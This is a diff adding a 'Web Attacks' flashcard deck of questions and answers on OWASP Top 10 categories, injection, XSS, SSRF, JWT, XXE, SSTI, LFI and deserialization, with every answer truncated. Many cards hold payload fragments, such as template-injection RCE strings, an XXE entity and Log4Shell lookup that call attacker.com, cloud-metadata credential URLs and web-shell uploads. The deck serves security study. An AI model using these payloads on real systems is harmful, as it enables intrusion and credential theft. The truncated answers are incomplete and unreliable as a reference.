@@ -1,0 +1,403 @@
+title: Web Attacks
+description: OWASP Top 10, injection attacks, API testing, deserialization, and web exploitation techniques
+cards:
+- question: What is Broken Access Control (A01:2021) in OWASP Top 10?
+  answer: Occurs when users can act outside their intended permissions. Includes IDOR, privilege...
+- question: What is Cryptographic Failures (A02:2021) in OWASP Top 10?
+  answer: Previously 'Sensitive Data Exposure'. Covers inadequate encryption of data at rest/in...
+- question: What is Injection (A03:2021) in OWASP Top 10?
+  answer: User-supplied data sent to an interpreter without validation. Includes SQL, NoSQL, OS...
+- question: What is Insecure Design (A04:2021) in OWASP Top 10?
+  answer: Risks from architectural/flawed design patterns rather than implementation bugs. Examples:...
+- question: What is Security Misconfiguration (A05:2021) in OWASP Top 10?
+  answer: 'Improperly configured security settings: default credentials, verbose error messages,...'
+- question: What is Vulnerable and Outdated Components (A06:2021) in OWASP Top 10?
+  answer: Using libraries/frameworks with known CVEs without proper version management. Attack vector...
+- question: What is Identification and Authentication Failures (A07:2021) in OWASP Top 10?
+  answer: Weak password policies, credential stuffing, session fixation, missing MFA, weak session...
+- question: What is Software and Data Integrity Failures (A08:2021) in OWASP Top 10?
+  answer: CI/CD pipeline compromise, unsigned software updates, insecure deserialization, and failure...
+- question: What is Security Logging and Monitoring Failures (A09:2021) in OWASP Top 10?
+  answer: Insufficient logging of security events, missing alerts for suspicious activity, unreadable...
+- question: What is Server-Side Request Forgery (A10:2021) in OWASP Top 10?
+  answer: Application fetches a remote resource from user-supplied URL without validation. Attackers...
+- question: What is a UNION-based SQL injection?
+  answer: Uses UNION SQL operator to append attacker's SELECT query results to the original result...
+- question: How do you determine the column count for a UNION SQLi?
+  answer: 'Use ORDER BY: '' ORDER BY 1-- increment until error. Or use NULL-based UNION: '' UNION SELECT...'
+- question: What is blind boolean SQL injection?
+  answer: 'Injects conditions that return true/false responses. Uses AND/OR with conditions like: ''...'
+- question: What is blind time-based SQL injection?
+  answer: 'Uses database sleep/delay functions to infer true/false from response timing. MySQL: '' AND...'
+- question: What is error-based SQL injection?
+  answer: 'Forces the database to return error messages containing extracted data. MySQL: '' AND...'
+- question: What is out-of-band (OOB) SQL injection?
+  answer: Exfiltrates data through alternate channels when direct response is unavailable. MySQL:...
+- question: What is second-order SQL injection?
+  answer: Malicious input is stored in the database and triggers SQLi when later retrieved and used...
+- question: What is NoSQL injection?
+  answer: Targets MongoDB, CouchDB, etc. Uses JSON operators like $ne, $gt, $regex. Login bypass:...
+- question: How do you bypass WAF during SQL injection?
+  answer: 'Techniques: case variation, comments, double URL encoding, HTTP parameter pollution,...'
+- question: How do you use sqlmap to enumerate databases?
+  answer: sqlmap -u 'http://target.com/page?id=1' --dbs to list databases. Then --tables -D dbname,...
+- question: How do you bypass login with sqlmap?
+  answer: sqlmap -u 'http://target.com/login' --data='user=admin&pass=test' --level=5 --risk=3...
+- question: How does sqlmap enumerate users and privileges?
+  answer: --users, --passwords, --privileges, --roles. Combine with --current-user and --current-db.
+- question: What is an advanced sqlmap technique with --os-shell?
+  answer: --os-shell attempts to write a web shell via MySQL INTO OUTFILE or MSSQL xp_cmdshell....
+- question: What is reflected XSS?
+  answer: Malicious script is reflected off the web server in the response. Non-persistent; requires...
+- question: What is stored XSS?
+  answer: Malicious script is permanently stored on the server and served to all users viewing the...
+- question: What is DOM-based XSS?
+  answer: Vulnerability exists entirely in client-side JavaScript. The page's JS writes...
+- question: What is mXSS (Mutation XSS)?
+  answer: InnerHTML/DOMParser mutation causes the browser to reinterpret sanitized markup as active...
+- question: How is XSS performed via SVG?
+  answer: 'SVG files can contain JavaScript: <svg xmlns="http://www.w3.org/2000/svg"><script>alert</scr...'
+- question: How is XSS performed via CSS?
+  answer: 'CSS expressions: expression). CSS injection via background-image: url). Modern: @import url...'
+- question: What is scriptless XSS?
+  answer: Achieves attacker goals without <script> tags. Uses CSS injection for data exfiltration,...
+- question: What is an XSS polyglot?
+  answer: 'payload that executes in multiple contexts/parsers. Example: "--></style></script><svg...'
+- question: How do you bypass CSP for XSS?
+  answer: 'Techniques: script gadgets in whitelisted libraries, dangling markup injection, CDN-hosted...'
+- question: How do you bypass XSS Auditor / filters?
+  answer: 'Old techniques: Content-Type charset override, nested scripts, param character encoding...'
+- question: What is a basic CSRF attack?
+  answer: 'Forces authenticated user to execute unwanted actions via crafted request. Example: <img...'
+- question: What is the SameSite cookie attribute and its CSRF impact?
+  answer: 'SameSite=Lax is default. Strict blocks all cross-site. None allows all. Bypass: sites with...'
+- question: How do you exploit CSRF token validation flaws?
+  answer: 'Token validation flaws: token not tied to session, predictable tokens, token stripping,...'
+- question: What is a custom header CSRF token bypass?
+  answer: If app validates a custom header but trusts any value if present, attacker can set...
+- question: How do you exploit CSRF on state-changing GET requests?
+  answer: CSRF on GET endpoints is trivial via <img src="...">, <script src="...">, <link...
+- question: What is the gopher protocol in SSRF exploitation?
+  answer: Gopher:// allows crafting arbitrary TCP packets. curl...
+- question: What are cloud metadata endpoints for SSRF?
+  answer: 'AWS: http://169.254.169.254/latest/meta-data/, Azure:...'
+- question: How do you discover internal services via SSRF?
+  answer: 'Probe common internal ports: 22, 80/8080/443, 3306, 6379, 27017, 9200. Use DNS rebinding to...'
+- question: What is protocol smuggling via SSRF?
+  answer: Using URL parser inconsistencies to bypass protocol validation. Example:...
+- question: How do you achieve RCE via SSRF?
+  answer: 'Target internal management interfaces: Hadoop, Spark, Docker, Jenkins. Also via gopher to...'
+- question: 'What is a JWT ''alg: none'' attack?'
+  answer: Set the JWT header algorithm to 'none'. The server accepts unsigned tokens. Payload:...
+- question: What is the RS256 to HS256 confusion attack?
+  answer: Change algorithm from RS256 to HS256. The server uses the public key as the HMAC secret....
+- question: What is JWKS injection / jku header attack?
+  answer: Set jku header to attacker's JWKS URL. If server fetches the key set from the URL without...
+- question: What is the kid (Key ID) injection attack?
+  answer: 'kid header used for key lookup can be exploited: SQL injection, path traversal, or command...'
+- question: What is OAuth2 authorization code interception?
+  answer: Attacker intercepts the authorization code via open redirect, XSS, or insecure...
+- question: What is OAuth2 CSRF / state parameter bypass?
+  answer: If OAuth flow lacks the 'state' parameter, attacker initiates auth, intercepts the code,...
+- question: What is a SAML signature wrapping attack?
+  answer: 'XML Signature Wrapping: attacker inserts a forged Assertion alongside the legitimate one....'
+- question: How do you bypass MFA?
+  answer: 'Techniques: MFA fatigue, session cookie theft after MFA, backup codes exposed, SIM...'
+- question: What is IDOR (Insecure Direct Object Reference)?
+  answer: 'User can access/modify resources by guessing/incrementing identifiers. Test: /api/users/1 →...'
+- question: What is forced browsing?
+  answer: 'Accessing unauthorized URLs/endpoints directly. Examples: /admin, /backup, /.git,...'
+- question: What is horizontal privilege escalation?
+  answer: 'Accessing another user''s data with same role level. Example: User A changes ''user_id=123''...'
+- question: What is vertical privilege escalation?
+  answer: 'Gaining higher privileges. Methods: role manipulation in JWT, cookie modification, forced...'
+- question: What is mass assignment?
+  answer: 'Attacker binds unexpected model fields via request parameters. Example: sending...'
+- question: What is an inline DTD XXE attack?
+  answer: 'Attacker defines entities within the XML document inline: <!DOCTYPE foo [<!ENTITY xxe...'
+- question: What is a parameter entity in XXE?
+  answer: 'Parameter entities used in DTD for entity reuse: <!DOCTYPE foo [<!ENTITY % file SYSTEM...'
+- question: What is external entity (XXE) via DTD?
+  answer: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>. Attacker hosts DTD...
+- question: What is out-of-band (OOB) XXE?
+  answer: 'Exfiltrates data via HTTP/DNS when no direct output is shown: <!ENTITY % file SYSTEM...'
+- question: What is blind XXE with error messages?
+  answer: 'Uses XML parsing errors to reveal data. Example: <!ENTITY % file SYSTEM...'
+- question: How do you exploit XXE via file upload?
+  answer: 'Upload SVG with embedded XXE: <svg xmlns="http://www.w3.org/2000/svg" width="500"...'
+- question: How do you identify Jinja2 SSTI and achieve RCE?
+  answer: 'Test: {{7*7}} → 49. RCE: {{config.__class__.__init__.__globals__[''os''].popen.read}} or...'
+- question: How do you exploit Twig SSTI?
+  answer: 'Test: {{7*7}}. RCE: {{_self.env.registerUndefinedFilterCallback}} {{_self.env.getFilter}}....'
+- question: How do you exploit Freemarker SSTI?
+  answer: 'Test: ${7*7}. RCE: <#assign ex="freemarker.template.utility.Execute"?new> ${ex}. Or:...'
+- question: How do you exploit Velocity SSTI?
+  answer: 'Test: #set $x. RCE: #set $e.getClass.forName.getRuntime.exec. Or use $class.inspect in...'
+- question: How do you exploit ERB (Ruby) SSTI?
+  answer: 'Test: <%= 7*7 %>. RCE: <%= system %> or <%= `id` %>. In newer ERB: require ''open3'';...'
+- question: What is SSTI detection methodology?
+  answer: '1. Inject math: {{7*7}}/${{7*7}}/{{7*''7''}} 2. Identify template engine by error...'
+- question: What is LFI (Local File Inclusion)?
+  answer: 'Includes local files through user-controlled parameters: ?page=../../../etc/passwd. Common...'
+- question: What is RFI (Remote File Inclusion)?
+  answer: 'Includes remote files: ?page=http://attacker.com/shell.txt. Requires allow_url_include=On...'
+- question: What is the PHP expect:// wrapper?
+  answer: 'expect:// executes commands directly: ?page=expect://id. Requires PHP expect extension. Not...'
+- question: What is the php://input wrapper?
+  answer: 'Reads raw POST body as file: ?page=php://input. POST data is executed. Example: POST <?php...'
+- question: What is the php://filter wrapper?
+  answer: 'Reads file contents without execution: ?page=php://filter/convert.base64-encode/resource=ind...'
+- question: What is the data:// wrapper for LFI?
+  answer: 'data:// URI scheme: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOw==. Requires...'
+- question: What is PHP log poisoning?
+  answer: 'Inject PHP code into web server logs: <?php system; ?>. Then include the log file:...'
+- question: What is /proc/self/environ LFI exploitation?
+  answer: LFI to /proc/self/environ leaks environment variables, including User-Agent. Inject PHP...
+- question: What is PHPGGC and how is it used?
+  answer: 'PHPGGC generates PHP gadget chains for deserialization exploits: ./phpggc Laravel/RCE1...'
+- question: How do you exploit PHP deserialization?
+  answer: 'Pass serialized data via unserialize. Common gadget chains: __destruct, __wakeup,...'
+- question: How do you exploit Python pickle deserialization?
+  answer: 'Pickle __reduce__ for code exec: class Exploit: def __reduce__: return). Serialize with...'
+- question: What is ysoserial and what are common chains?
+  answer: 'Java deserialization tool. Chains: CommonsCollections1-7, JBoss, ROME, Jython, JRMPClient,...'
+- question: What is ysoserial.net used for?
+  answer: '.NET deserialization tool: ysoserial.exe -g WindowsIdentity -f LosFormatter -c ''calc''....'
+- question: What is Ruby marshalling deserialization?
+  answer: 'Ruby Marshal.load executes code via: class Evil; def self.load; system; end; end;...'
+- question: How do you exploit Node.js deserialization?
+  answer: 'node-serialize / node-cookie-serialize eval: {"rce":"_$$ND_FUNC$$_function{require.exec}"}....'
+- question: How do you enumerate REST API endpoints?
+  answer: 'Common patterns: /api/v1/, /api/users, /api/swagger.json, /api/docs, /openapi.json,...'
+- question: What is GraphQL introspection?
+  answer: Query the __schema field to list all types, queries, mutations, and fields. Send:...
+- question: What is a GraphQL depth attack?
+  answer: 'Deeply nested queries exhaust server resources: query { user { posts { comments { user {...'
+- question: What is a GraphQL batching attack?
+  answer: Sending many queries in a single request to bypass rate limiting:...
+- question: What is HTTP parameter pollution (HPP)?
+  answer: 'Multiple same-name parameters cause different server behaviors: ?user=foo&user=admin. PHP...'
+- question: What is JSON injection?
+  answer: Injecting special characters into JSON that breaks parsers or adds unexpected keys....
+- question: What is a CORS misconfiguration with credential reflection?
+  answer: Server reflects Origin header in Access-Control-Allow-Origin with...
+- question: What is a CORS origin reflection attack?
+  answer: 'Server copies Origin header to ACAO without validation: Access-Control-Allow-Origin:...'
+- question: What are race conditions in web applications?
+  answer: 'TOCTOU bugs: coupon code used multiple times simultaneously, purchase at old price during...'
+- question: What is integer manipulation in business logic?
+  answer: 'Modifying integer values to unexpected extremes: negative prices, overflow, decimal...'
+- question: What is coupon code abuse?
+  answer: Reusing single-use coupons, stacking non-stackable coupons, applying expired coupons,...
+- question: What is a sequential nonce attack?
+  answer: 'If nonces are sequential/predictable, attacker can calculate next token. Example: password...'
+- question: How do you bypass file upload content-type restrictions?
+  answer: 'Change Content-Type header: application/x-php, but if server checks magic bytes, prepend...'
+- question: How do you bypass file upload extension filters?
+  answer: 'Extensions to try: .php5, .phtml, .php7, .shtml, .php.345, .php.jpg, .PhP, .php%00.jpg,...'
+- question: What is a polyglot file in upload attacks?
+  answer: 'File that is valid in two formats simultaneously. Example: GIF+PHP polyglot: GIF89a<?php...'
+- question: What is .htaccess overwrite via file upload?
+  answer: 'Upload .htaccess to enable PHP execution in upload dir: AddType application/x-httpd-php...'
+- question: What is zip/tar symlink upload attack?
+  answer: 'Archive extraction creates files with symlinks. Create zip with symlink: ln -s /etc/passwd...'
+- question: What is client-side prototype pollution?
+  answer: Injects properties into Object.prototype via unsafe merge/clone/assign operations. Affects...
+- question: What is server-side prototype pollution?
+  answer: Node.js server merges user input into objects without filtering __proto__/constructor keys....
+- question: How do you detect client-side prototype pollution?
+  answer: 'Inject via URL: ?__proto__.test=value. Check if Object.prototype.test is set in browser...'
+- question: What is HTTP request smuggling (CL.TE)?
+  answer: 'Front-end uses Content-Length, back-end uses Transfer-Encoding: chunked. Smuggled: POST /...'
+- question: What is HTTP request smuggling (TE.CL)?
+  answer: Front-end uses Transfer-Encoding, back-end uses Content-Length. Front-end processes chunked...
+- question: What is HTTP request smuggling (TE.TE)?
+  answer: Both front-end and back-end use Transfer-Encoding but parse differently due to header...
+- question: What is web cache deception?
+  answer: Trick the cache into storing sensitive responses. Append static-like path:...
+- question: What is web cache poisoning?
+  answer: 'Manipulate cached response to serve malicious content to others. Techniques: unkeyed header...'
+- question: How do you exploit SSRF to AWS metadata?
+  answer: Curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ returns role names....
+- question: How do you exploit SSRF to GCP metadata?
+  answer: Curl http://metadata.google.internal/computeMetadata/v1/project/project-id for project...
+- question: How do you exploit SSRF to Azure metadata?
+  answer: Curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=h...
+- question: What is subdomain takeover?
+  answer: When a CNAME/dns record points to an unclaimed cloud service. Attacker re-registers the...
+- question: How do you detect subdomain takeover?
+  answer: 'Tools: subjack, subover, nuclei -t dns/takeovers/. Fingerprint error pages: ''NoSuchBucket'',...'
+- question: How do you detect XSS via polyglot injection?
+  answer: 'Use multi-context payloads: ''"//><marquee onfinish=confirm>//. Test in URL, attribute,...'
+- question: What is dangling markup injection?
+  answer: 'Injects unclosed HTML tags to capture content across boundaries: <img...'
+- question: What is CRLF injection?
+  answer: Injects \r\n into HTTP headers to split response:...
+- question: What is a padding oracle attack?
+  answer: Exploits CBC-mode padding validation. Web app returns different errors for valid vs invalid...
+- question: What is host header injection?
+  answer: 'Manipulates Host header to: password reset poisoning, cache poisoning, SSRF, web cache...'
+- question: What is password reset poisoning?
+  answer: Host header / X-Forwarded-Host manipulates password reset link generation. App sends reset...
+- question: What is a server-level template injection payload for tplmap?
+  answer: tplmap --url 'http://target.com/page?name=*' automates SSTI detection and exploitation....
+- question: What is a content spoofing attack?
+  answer: Injecting markup into error pages or parameter reflection to misrepresent the site. No...
+- question: What is DNS rebinding?
+  answer: Bypasses SSRF IP validation by using a domain that resolves to different IPs alternately....
+- question: What is a wide-angle XSS scanning payload?
+  answer: '"''><img src=x onerror=alert> tested in all parameters including headers. Also try :before,...'
+- question: How do you bypass 403 forbidden?
+  answer: 'Techniques: X-Original-URL: /admin, X-Rewrite-URL: /admin, X-Forwarded-For: 127.0.0.1, URL...'
+- question: What is a clickjacking attack?
+  answer: Embeds target site in an invisible iframe overlaid on attacker's page. Victim clicks...
+- question: What is a WebSocket hijacking?
+  answer: CSRF-like attack on WebSocket handshake. No Same-Origin-Policy applies to WebSocket....
+- question: What is PostMessage origin validation bypass?
+  answer: Window.postMessage without proper origin check allows cross-origin message injection....
+- question: What is a SQL injection detection with timing?
+  answer: 'MySQL: '' AND BENCHMARK)-- , '' OR SLEEP-- . PostgreSQL: '' OR pg_sleep-- . MSSQL: '' WAITFOR...'
+- question: What are common MongoDB NoSQL operators?
+  answer: $ne, $gt, $regex, $in, $nin, $where, $exists, $type.
+- question: How do you dump MySQL with a UNION injection?
+  answer: ''' UNION SELECT 1,group_concat,3 FROM information_schema.tables WHERE...'
+- question: What is a second-order deserialization attack?
+  answer: Malicious serialized object stored and deserialized later on a different page/endpoint....
+- question: How do you bypass SQLi filters with comments?
+  answer: 'Use inline comments: UN/**/ION SEL/**/ECT. Multi-line: /*!UNION*/ /*!SELECT*/. Also use...'
+- question: What is a SQL injection via HTTP headers?
+  answer: 'Inject in headers: User-Agent, X-Forwarded-For, Cookie, Referer. Server-side query logs or...'
+- question: What is a LDAP injection?
+  answer: 'Injection into LDAP queries via user input. Bypass: user=*)))(|(uid=* and look for...'
+- question: What is XPath injection?
+  answer: 'Injection into XPath queries. Test: '' or ''1''=''1. Extract data: '' and ''1''=''2 union | //* ....'
+- question: What is a command injection detection?
+  answer: 'Test payloads: ; ls, && dir, | whoami, `id`, $. Blind detection: ; ping -n 10 127.0.0.1....'
+- question: What is blind command injection time-based?
+  answer: 'Linux: || sleep 5 #, `sleep 5`, $. Windows: & ping -n 5 127.0.0.1 &. Use timing differences...'
+- question: What is SMTP header injection?
+  answer: 'Newlines in email fields inject headers: To: victim@a.com%0aCc: attacker@a.com. Spam,...'
+- question: What is a template injection via Angular?
+  answer: 'Angular template expression: {{constructor.constructor'')}}. In AngularJS sandbox escapes:...'
+- question: What is a directory traversal attack?
+  answer: 'Access parent directories: ../../../etc/passwd. URL encoding: %2e%2e%2f. Unicode: ..%c0%af....'
+- question: What is a regex injection (ReDoS)?
+  answer: 'Evil regex with catastrophic backtracking causes CPU exhaustion: /^+$/. Input:...'
+- question: What is parameter pollution with arrays?
+  answer: 'PHP converts ?a[]=1&a[]=2 to array. Used to bypass type checks: if bypassed with...'
+- question: What is a PHP type juggling attack?
+  answer: 'Loose comparison in PHP: ''admin'' == 0 → true. ''0e123'' == ''0e456'' → true. Login bypass via...'
+- question: What is a HTTP request splitting?
+  answer: Inject CRLF to split one HTTP request into two. Attacker appends malicious second request...
+- question: How do you exploit file upload via ImageMagick?
+  answer: 'ImageMagick could execute commands via malformed image files. Shell via .mvg: push...'
+- question: What is a CRLF injection to XSS?
+  answer: 'Inject headers to create script tag: %0d%0aContent-Type:...'
+- question: What is a session fixation attack?
+  answer: Attacker sets victim's session ID to a known value. Victim logs in, attacker uses the known...
+- question: What is a Web cache poisoning via unkeyed headers?
+  answer: Cache keys don't include X-Forwarded-Host/X-Forwarded-Proto. Attacker sets...
+- question: What is a cache key injection?
+  answer: 'Manipulating components of the cache key: parameter cloaking, header injection, HTTP method...'
+- question: What is a race window in password reset?
+  answer: Multiple password reset requests in rapid succession with the same token can all be valid....
+- question: What is a session token in URL leak?
+  answer: 'Session tokens passed in URL query strings or fragments. Leaked via: Referer header,...'
+- question: What is a Cookie tossing attack?
+  answer: Subdomain sets cookie for parent domain. If login session cookie lacks Domain restriction,...
+- question: What is a Reverse Tabnabbing?
+  answer: If a page opens a link with target=_blank and no rel=noopener, the opened page gains...
+- question: How do you bypass SameSite=Strict on subdomains?
+  answer: If SameSite=Strict is set without Secure, attacker sets same cookie via subdomain cookie...
+- question: What is a DNS rebinding for SSRF?
+  answer: Use domain 7f000001.1e1.ip6.cc resolves to 127.0.0.1. First DNS query returns safe IP,...
+- question: What is a console-based XSS filter evasion?
+  answer: 'Event handlers: onerror, onload, onfocus, onmouseover, onpointerenter. Non-event:...'
+- question: What is a cookie prefix security mechanism?
+  answer: '__Host- prefix: cookie must be Secure, Path=/, no Domain attribute. __Secure- prefix: must...'
+- question: How do you exploit XXE in SOAP APIs?
+  answer: 'SOAP XML with XXE: <soap:Body><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM...'
+- question: What is a HTTP method override attack?
+  answer: 'Server translates X-HTTP-Method-Override: DELETE on a GET request. Bypass CSRF protection...'
+- question: What is a JSONP callback injection?
+  answer: 'JSONP endpoint with user-controlled callback param: /api?callback=myFunc. Change to:...'
+- question: What is a Flash cross-domain (crossdomain.xml) attack?
+  answer: If /crossdomain.xml allows *, Flash in attacker's site can make requests to target. Leak...
+- question: What is a Tomcat Ghostcat (CVE-2020-1938)?
+  answer: 'AJP connector enabled on port 8009 with no auth. LFI via AJP: curl -d...'
+- question: What is a Spring4Shell (CVE-2022-22965)?
+  answer: Spring MVC class injection via parameter binding:...
+- question: What is a Log4Shell (CVE-2021-44228)?
+  answer: 'Log4j JNDI injection: ${jndi:ldap://attacker.com/a}. Logging user-controlled strings...'
+- question: What is a Shellshock (CVE-2014-6271)?
+  answer: 'CGI-based bash env variable injection: User-Agent: { :;}; /bin/bash -c ''command''. Apache...'
+- question: What is a Struts2 S2-045 RCE?
+  answer: 'Content-Type header injection: Content-Type: %{...}. HTTP header processed as OGNL...'
+- question: What is a GraphQL argument injection?
+  answer: 'Injecting into query arguments: mutation { deleteUser }. If IDs passed unsafely to backend...'
+- question: What is a GraphQL query depth bomb?
+  answer: 'Crafted deeply nested query causes DoS. Use fragments for deep recursion: fragment F on...'
+- question: What is a restQL injection?
+  answer: Injection into restQL query syntax. Similar to injection in any custom query language. Fuzz...
+- question: What is a OData filter injection?
+  answer: 'OData $filter params tested for injection: $filter=name eq ''admin'' or 1 eq 1. Test with...'
+- question: What is a HTTP header injection via Referer?
+  answer: 'Referer header often logged or reflected unsafely. Inject CRLF: Referer:...'
+- question: What is a WebDAV PUT method attack?
+  answer: 'If WebDAV enabled and PUT allowed, upload shell directly: curl -X PUT -d ''<?php system;?>''...'
+- question: What is a Profoundly Deprecated Insecure URL access?
+  answer: Applications using file_get_contents, curl_exec with user-supplied URLs. 'php://' filter...
+- question: What is a server-side request forger via blind SSRF?
+  answer: 'No response body but external interaction observable: DNS/HTTP callback. Use Burp...'
+- question: What is a WebSocket CSRF on unauthenticated connections?
+  answer: If WebSocket handshake doesn't authenticate, any site can open connection via new...
+- question: What is a JWT unverified signature accept attack?
+  answer: Some JWT libraries accept 'Bearer eyJhbGciOiJub25lIn0...' without verifying signature....
+- question: What is a JWT token stripping attack?
+  answer: If app optionally accepts JWTs, remove token entirely. Some apps fall back to session...
+- question: What is a JWT kid SQL injection?
+  answer: 'If kid parameter used in SQL query: SELECT * FROM keys WHERE kid=''kid_value''. Kid...'
+- question: What is a JWT kid path traversal?
+  answer: 'kid: ../../../../dev/null returns null/empty key. kid: /proc/sys/kernel/random/uuid returns...'
+- question: What is a JWT JKU header bypass?
+  answer: JKU points to attacker's JWKS hosted on a server the app trusts. If app fetches from any...
+- question: What is a OAuth implicit grant interception?
+  answer: Implicit grant returns access token in URL fragment. Token leaked via Referer header,...
+- question: What is a OAuth PKCE Downgrade attack?
+  answer: If server supports both regular code flow and PKCE flow, attacker intercepts and removes...
+- question: What is a SAML XML signature exclusion?
+  answer: Removing the Signature element from SAML Response. Some SAML libraries skip signature...
+- question: What is a SAML Response manipulation with XSLT?
+  answer: 'If SAML processing uses XSLT transformation, inject XSLT: <xsl:stylesheet> <xsl:template...'
+- question: What is a OAuth scope escalation?
+  answer: 'Modifying scope parameter in authorization request: scope=user_info → scope=admin. If...'
+- question: What is a Unicode normalization bypass?
+  answer: 'Unicode equivalence bypasses filters. Example: <scrīpt> normalizes to <script> after...'
+- question: What is a server-side polyglot for parameter smuggling?
+  answer: 'Content-Type mixing: same parameter sent as JSON and form-urlencoded simultaneously...'
+- question: How do you detect GraphQL via response?
+  answer: 'Common GraphQL responses include: errors: [{message:...}], data: {...}, extensions: {...}....'
+- question: What is a GraphQL batching without aliases?
+  answer: 'Using JSON array of operations: [{"query":"..."}, {"query":"..."}, ...]. Each operation...'
+- question: What is a SSRF via DNS rebinding tools?
+  answer: 'Tools: rbndr.us, 1u.ms, lock.cmpxchg.io. Points to attacker and target alternately. Useful...'
+- question: What is a SSRF via open redirect?
+  answer: App validates url parameter starts with http://allowed.com. Bypass:...
+- question: What is a JavaScript prototype pollution to XSS?
+  answer: 'Gadget: if app checks obj.defaultValue → attacker sets __proto__.defaultValue =...'
+- question: What is a server-side prototype pollution to RCE?
+  answer: 'Pollute Object.prototype to override template engine config. Example: Node.js with...'
+- question: What is a CVE-based YAML deserialization (SnakeYAML)?
+  answer: 'SnakeYAML constructor RCE: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader...'
+- question: What is a fastcgi param injection?
+  answer: If app proxies to PHP-FPM with user-controlled params:...
+- question: What is a PHP_FPM / FastCGI SSRF?
+  answer: SSRF to 127.0.0.1:9000 with gopher:// sends PHP-FPM payload. Sets PHP_VALUE:...
+- question: What is a Gopher Redis SSRF exploit?
+  answer: 'Redis via gopher: gopher://redis:6379/_SET%20mykey%20%22test%22%0d%0a. RCE via: CONFIG SET...'
+- question: What is a web cache poisoning via unkeyed cookie?
+  answer: If cookie not in cache key, attacker sets malicious cookie on victim. When victim visits...
+- question: What is a web cache poisoning via Vary header?
+  answer: 'Vary: User-Agent — but if attacker can force victim to use attacker''s User-Agent, poisoned...'
+- question: What is a CSRF token not bound to session?
+  answer: App issues token but accepts any valid token regardless of session. Attacker creates...
